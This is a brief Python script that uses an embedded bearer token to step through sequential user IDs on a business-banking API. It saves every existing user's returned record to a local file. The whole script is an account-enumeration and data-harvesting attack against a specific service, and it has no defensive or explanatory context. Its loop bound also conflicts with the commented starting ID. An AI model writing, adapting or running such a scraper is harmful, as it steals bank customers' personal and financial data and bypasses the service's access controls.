import requests, json, time

bearer = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlcyI6IlVTRVIiLCJpYXQiOjE2ODAxODY0NzMsInN1YiI6IjIyMjM5NyIsImV4cCI6MTY4MDI3Mjg3M30.UtGoQEgyVhRApzS99lQBC0lXf2pkzsyzBlOeQUamNgk"

userid = input("Enter starting point: ") #400683
userid = int(userid.strip())

while userid < 333333:
    userid += 1
    url = f'https://business-banking.kudi.ai/user/{userid}'
    mheaders = {"Authorization": bearer}
    x = requests.get(url, headers = mheaders)
    resp = x.text
    resp2 = resp[27:46]
    
    if resp2 == "User does not exist":
        print(f"{userid}==> user does not exist")
    else:
        print(x.text)
        with open("AaD-2023.txt", "a") as handle:
            handle.write(str(resp + "\n" + "------------------------------------------------------" + "\n" + "\n" + "------------------------------------------------------" + "\n"))
            print("\n Recorded")
